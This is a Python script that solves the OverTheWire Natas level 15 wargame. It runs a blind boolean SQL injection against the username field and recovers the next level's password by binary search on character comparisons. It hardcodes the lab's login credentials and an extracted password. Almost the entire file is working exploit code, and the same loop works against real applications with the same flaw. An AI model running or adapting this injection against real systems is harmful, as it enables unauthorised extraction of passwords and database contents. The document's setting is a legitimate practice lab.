import requests
from requests.auth import HTTPBasicAuth

def query(param):
    print("querying {}".format(param))
    url = "http://natas15.natas.labs.overthewire.org/index.php"
    auth = HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
    params = {'username': param}

    OK = 'This user exists.'

    res = requests.get(url, params=params, auth=auth)

    return OK in res.text

## get length
# len = 0
length = 32
while query('natas16" and CHAR_LENGTH(password) <= {} #'.format(length)) == False:
    length += 1

print('len is {}'.format(length))

import string
chars = list(sorted(string.printable[:62]))
print(chars)
# cur = ''
cur = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
while len(cur) < length:
    lo = 0
    hi = len(chars)
    while (hi != lo+1):
        mid = (hi + lo) // 2

        test = cur + chars[mid]
        if query('natas16" and password >= BINARY "{}" #'.format(test)):
            lo = mid
        else:
            hi = mid

    cur += chars[lo]
    print(cur)
